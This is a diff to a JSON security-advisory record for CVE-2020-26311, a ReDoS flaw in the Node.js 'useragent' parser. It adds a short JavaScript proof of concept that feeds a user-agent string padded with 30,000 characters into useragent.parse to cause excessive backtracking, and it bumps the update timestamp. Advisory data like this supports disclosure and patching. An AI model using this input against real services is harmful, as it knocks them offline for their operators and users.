@@ -39,12 +39,12 @@
         "Value": "CVE-2020-26311"
       }
     ],
-    "Description": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).",
+    "Description": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).\n\n## PoC\n```js\nasync function exploit() {\n   const useragent = require(\\\"useragent\\\");\n\n   // Create a malicious user-agent that leads to excessive backtracking\n   const maliciousUserAgent = 'Mozilla/5.0 (' + 'X'.repeat(30000) + ') Gecko/20100101 Firefox/77.0';\n\n   // Parse the malicious user-agent\n   const agent = useragent.parse(maliciousUserAgent);\n\n   // Call the toString method to trigger the vulnerability\n   const result = await agent.device.toString();\n   console.log(result);\n}\n\nawait exploit();\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2024-10-26T21:30:47Z",
     "Severity": "MODERATE",
     "Summary": "useragent Regular Expression Denial of Service vulnerability",
-    "UpdatedAt": "2024-10-30T19:03:28Z",
+    "UpdatedAt": "2025-09-03T15:17:54Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 7.5,
